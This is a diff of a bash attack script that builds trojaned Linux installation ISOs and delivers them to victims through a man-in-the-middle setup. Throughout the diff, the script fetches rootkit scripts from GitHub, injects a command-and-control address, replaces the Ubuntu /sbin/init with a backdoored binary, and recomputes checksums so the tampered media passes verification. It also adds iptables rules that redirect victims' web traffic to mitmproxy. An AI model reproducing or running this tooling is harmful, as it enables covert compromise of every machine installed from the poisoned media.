@@ -18,7 +18,7 @@ DEPENDENCIES=("bash" "cp" "mv" "rm" "ls" "mkdir" "tar" "awk" "grep" "sed" "md5su
 
 function usage {
     echo "Please specify the client IP and the command and control server"
-    echo "Usage: $0 <victim_ip> <cnc>"
+    echo "Usage: $0 <target network interface> <cnc>"
     exit 1
 }
 
@@ -35,6 +35,16 @@ function dependency_check {
          exit
      fi
    done
+   
+   if [ $(which mkisofs) ]; then
+    ISO_EXEC="mkisofs"
+else if [ $(which genisoimage) ]; then
+    ISO_EXEC="genisoimage"
+else 
+    echo "Unable to find mkisofs or genisoimage,exiting..."
+    exit
+fi
+
 }
 #include openssl,netcat,wget here if they aren't installed
 function install_packages {
@@ -83,55 +93,13 @@ function install_pypi {
         exit 1
     fi
 }
+function mount_extract_iso {
+echo "Please stand by,extracting files from installation media..."
+mount -oloop ./${ISO_BASE} ./backdoor-iso-ro
+cp -a ./backdoor-iso-ro/* ./backdoor-iso-rw/ 
+}
 
-function setup_funtoo (){
-RESCUE_BASE="systemrescuecd-x86-4.7.1.iso"
-STAGE3_BASE="stage3-latest.tar.xz"
-ISO_ARGS="-o ../out/${RESCUE_BASE} -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -J -R -V ${RESCUE_BASE} ."
-if [ $(which mkisofs) ]; then
-    ISO_EXEC="mkisofs"
-else
-    ISO_EXEC="genisoimage"
-fi
-
-if [ -e "out/"$RESCUE_BASE ] && [ -e "out/"$STAGE3_BASE ] && [ -e "out/"$STAGE3_BASE".hash.txt" ];then
-  dialog --yesno "Existing installation media files found in the output directory. Continue funtoo setup?" 9 40
-   if [ $? -ge 1 ]; then
-      return
-   fi
-fi
-
-mkdir backdoor-stage3 backdoor-iso-ro backdoor-iso-rw out
-
-
-if [ -e $STAGE3_BASE ] && [ -e $RESCUE_BASE ]; then
-  dialog --yesno "Existing original installation media found, skip download?" 7 40
-     if [ $? -ge 1 ]; then
-# Get all the packages
-fetch http://build.funtoo.org/funtoo-current/x86-64bit/generic_64/$STAGE3_BASE 
-fetch http://build.funtoo.org/distfiles/sysresccd/$RESCUE_BASE
-     fi
- else
-fetch http://build.funtoo.org/funtoo-current/x86-64bit/generic_64/$STAGE3_BASE 
-fetch http://build.funtoo.org/distfiles/sysresccd/$RESCUE_BASE
-fi
-
-# Mount the ISO
-mount -oloop ./${RESCUE_BASE} ./backdoor-iso-ro
-
-   echo "Please stand by,extracting files from installation media..."
-
-
-cp -a ./backdoor-iso-ro/* ./backdoor-iso-rw/ &&
-tar -C backdoor-stage3 -xf ./stage3-latest.tar.xz &&
-unsquashfs -d ./backdoor-squash/ ./backdoor-iso-ro/sysrcd.dat
-
-if [ $? -ge 1 ];then
-     echo "Error extracting stage3 and/or ISO" 
-     exit
-fi
-
-
+function gotta_fetchem_all {
 echo "fetching mitmproxy inline script and backdoor script."
 # Get the backdoor scripts
 curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/redirect.py > redirect.py &&
@@ -143,6 +111,51 @@ if [ $? -ge 1 ];then
      echo "Error fetching scripts" 
      exit
 fi
+
+}
+
+
+function setup_funtoo (){
+ISO_BASE="systemrescuecd-x86-4.7.1.iso"
+STAGE3_BASE="stage3-latest.tar.xz"
+ISO_ARGS="-o ../out/${ISO_BASE} -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -J -R -V ${ISO_BASE} ."
+echo "Starting Funtoo setup."
+
+if [ -e "out/"$ISO_BASE ] && [ -e "out/"$STAGE3_BASE ] && [ -e "out/"$STAGE3_BASE".hash.txt" ];then
+  dialog --yesno "Existing installation media files found in the output directory. Continue funtoo setup?" 9 40
+   if [ $? -ge 1 ]; then
+      return
+   fi
+fi
+
+mkdir backdoor-stage3 backdoor-iso-ro backdoor-iso-rw out
+
+
+if [ -e $STAGE3_BASE ] && [ -e $ISO_BASE ] && [ -e 'backdoor-squash' ]; then
+  dialog --yesno "Existing original installation media found, skip download?" 7 40
+     if [ $? -ge 1 ]; then
+# Get all the packages
+fetch http://build.funtoo.org/funtoo-current/x86-64bit/generic_64/$STAGE3_BASE 
+fetch http://build.funtoo.org/distfiles/sysresccd/$ISO_BASE
+     fi
+ else
+fetch http://build.funtoo.org/funtoo-current/x86-64bit/generic_64/$STAGE3_BASE 
+fetch http://build.funtoo.org/distfiles/sysresccd/$ISO_BASE
+fi
+
+# Mount the ISO
+mount_extract_iso $ISO_BASE &&
+tar -C backdoor-stage3 -xf ./stage3-latest.tar.xz &&
+rm -rf ./backdoor-squash > /dev/null 2>&1
+
+unsquashfs -d ./backdoor-squash/ ./backdoor-iso-ro/sysrcd.dat
+
+if [ $? -ge 1 ];then
+     echo "Error extracting stage3 and/or ISO" 
+     exit
+fi
+
+gotta_fetchem_all
 
 echo "Applying Backdoor."
 # Update the scripts with the command and control
@@ -189,12 +202,83 @@ fi
 
 cd ../out && sha256sum $STAGE3_BASE >  $STAGE3_BASE".hash.txt" && cd .. 
 umount backdoor-iso-ro
+echo "Funtoo setup finished."
 
 }
 
 function setup_ubuntu(){
+ISO_BASE="ubuntu-14.04.4-desktop-amd64.iso"
+ISO_ARGS="-o ../out/${ISO_BASE} -cache-inodes -J -l -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -r -V ${ISO_BASE} ."
+echo "Starting ubuntu setup..."
 
-popup "Ubuntu setup - Not implemented yet"
+if [ -e "out/"$ISO_BASE ];then
+  dialog --yesno "Existing installation media files found in the output directory. Continue ubuntu setup?" 9 40
+   if [ $? -ge 1 ]; then
+      return
+   fi
+fi
+
+mkdir  backdoor-iso-ro backdoor-iso-rw out
+
+if  [ -e 'backdoor-squash' ]; then
+  dialog --yesno "Existing original installation media found, skip download?" 7 40
+     if [ $? -ge 1 ]; then
+# Get ISO
+fetch http://mirror.symnds.com/distributions/ubuntu-releases/14.04.4/$ISO_BASE
+     fi
+ else
+fetch http://mirror.symnds.com/distributions/ubuntu-releases/14.04.4/$ISO_BASE
+fi
+
+
+mount_extract_iso ${ISO_BASE} &&
+rm -rf ./backdoor-squash > /dev/null 2>&1
+
+unsquashfs -d ./backdoor-squash/ backdoor-iso-ro/ubuntu/casper/filesystem.squashfs
+
+if [ $? -ge 1 ];then
+     echo "Error extracting ISO" 
+     exit
+fi
+
+gotta_fetchem_all
+##########
+#don't function wrap the following,it might have distro specific code
+echo "Applying Backdoor."
+# Update the scripts with the command and control
+sed -i "s/REPLACEME/$CNC/" ./rtkt.sh
+sed -i "s/REPLACEME/$INTERFACE_IP/" redirect.py
+
+cp   ./backdoor-squash/sbin/init ./ &&  ./pack.sh ./rtkt.sh ./init
+
+if [ $? -ge 1 ];then
+     echo "Error applying backdoor" 
+     exit
+fi
+
+sed -i "s/MYPATH/init/" ./init
+cp ./init ./backdoor-squash/sbin/init && chmod a+x ./backdoor-squash/sbin/init
+if [ $? -ge 1 ]; then
+     echo "Error copying back backdoored binary" 
+     exit
+fi
+
+##############
+echo "Re-packaging backdoored installation media, you should probably go get a coffee or something, this will take a while..."
+
+cd backdoor-squash && 
+mksquashfs * ../filesystem-backdoored.squashfs && cd ../backdoor-iso-rw/casper/ -e boot &&
+rm filesystem.squashfs && mv ../../filesystem-backdoored.squashfs ./filesystem.squashfs &&
+cd .. && find . -type f -print0 | xargs -0 md5sum | grep -v "\./md5sum.txt" > md5sum.txt &&
+$ISO_EXEC $ISO_ARGS
+
+if [ $? -ge 1 ]; then
+   "Error re-packing backdoored ISO"
+   exit
+fi
+
+echo "Ubuntu $ISO_BASE setup finished."
+
 }
 
 function setup_mint(){
@@ -272,13 +356,14 @@ if [ $# -lt 2 ]; then
 fi
 
 
-VICTIM_IP="$1"
+INTERFACE="$1"
 CNC="$2"
 
 if  [ $(whoami) !=  "root" ];then
    echo "Not running as root,exiting..."
    exit
 fi
+export LANG
 
 install_packages
 
@@ -291,26 +376,17 @@ if  [ $(uname -o) != "GNU/Linux" ];then
 fi
 
 
-# Pick victim IP, find what interface it is on, setup
-# iptables rules accordingly for the interface
-#
-# Example:
-# victim: 172.16.10.81
-# ip neigh show to 172.16.10.81
-# 172.16.10.81 dev eth1 lladdr ac:ef:ac:e0:c3:01 REACHABLE
-
-if [[ "$(ip neigh show to $VICTIM_IP)" == "" ]]; then
-    INTERFACE="eth0"
-else
-    INTERFACE="$(ip neigh show to $VICTIM_IP | awk '{print $3}')"
-fi
-
-INTERFACE_IP="$(ip -4 addr show $INTERFACE | grep -oP "(?<=inet).*(?=/)"  | sed -e 's/^[ \t]*//')"
-
+  dialog --yesno "Will we be using this same device to host backdoored files?" 7 40
+if [ $? -le 0 ]; then
+    INTERFACE_IP="$(ip -4 addr show $INTERFACE | grep -oP "(?<=inet).*(?=/)"  | sed -e 's/^[ \t]*//')"
 if [ $? -ge 1 ]; then
-   INTERFACE_IP="0.0.0.0"
+   printf %"s\n" "Unable to find interface IP address, please enter an IP address or domain name where you expect lighttpd to be listening:"
+   read INTERFACE_IP
 fi
-
+else 
+   printf %"s\n" "Please enter the IP address or domain name of the backdoored file server:"
+   read INTERFACE_IP
+fi
 
 
 
@@ -414,7 +490,7 @@ sed -i "s#PWD#${PWD}#" lighttpd.conf
 lighttpd -f lighttpd.conf&
 
 if [ $? -ne 0 ]; then
-    popup "Failed to bind 81, check that port isn't in use and try again"
+    popup "Failed to bind 80, check that port isn't in use and try again"
     exit 1
 fi
 
@@ -423,8 +499,11 @@ fi
 
 
 # Set it up
-iptables -t nat -A PREROUTING -i $INTERFACE -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080 
-     if [ $? -ge 1 ];then
+iptables -t nat -A PREROUTING 0 -i $INTERFACE -p tcp -m tcp -d $INTERFACE_IP --dport 80 -j ACCEPT  -m comment --comment "Don't do anything with traffic to $INTERFACE_IP on port 80"
+
+iptables -t nat -A PREROUTING 1 -i $INTERFACE -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080 -m comment --comment "Forward everyting to tcp/80 to port 8080 where mitmproxy will be listening"
+    
+    if [ $? -ge 1 ];then
          echo "Error applying iptables rule on $INTERFACE" 
          exit
      fi
